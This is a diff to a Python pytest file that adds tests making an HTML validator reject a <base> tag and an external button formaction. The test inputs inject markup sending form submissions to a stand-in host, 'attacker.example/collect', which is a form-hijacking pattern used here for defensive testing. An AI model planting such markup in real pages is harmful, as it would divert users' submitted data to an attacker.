@@ -3,7 +3,7 @@ from __future__ import annotations
 from http import HTTPStatus
 
 import pytest
-from _html import assert_valid_document_html
+from _html import assert_valid_admin_html, assert_valid_document_html
 from _http_handler import (
     HandlerCaptureMixin,
     captured_response,
@@ -147,6 +147,36 @@ def test_browser_normalized_external_form_actions_are_rejected(action: str) -> N
 
     with pytest.raises(AssertionError, match="form action must remain same-origin"):
         assert_valid_document_html(document)
+
+
+def test_base_element_is_rejected() -> None:
+    document = _document_with_form(action="/admin/mutate", csrf=True).replace(
+        "<head>",
+        '<head><base href="https://attacker.example/">',
+    )
+
+    for assertion in (assert_valid_document_html, assert_valid_admin_html):
+        with pytest.raises(AssertionError, match=r"<base> is not allowed"):
+            assertion(document)
+
+
+def test_external_formaction_is_rejected() -> None:
+    document = _document_with_form(action="/admin/mutate", csrf=True).replace(
+        "</form>",
+        '<button type="submit" formaction="//attacker.example/collect">Submit</button></form>',
+    )
+
+    with pytest.raises(AssertionError, match="formaction must remain same-origin"):
+        assert_valid_document_html(document)
+
+
+def test_local_formaction_remains_valid() -> None:
+    document = _document_with_form(action="/admin/mutate", csrf=True).replace(
+        "</form>",
+        '<button type="submit" formaction="/admin/alternate">Submit</button></form>',
+    )
+
+    assert_valid_document_html(document)
 
 
 def test_post_with_csrf_remains_valid_by_default() -> None:
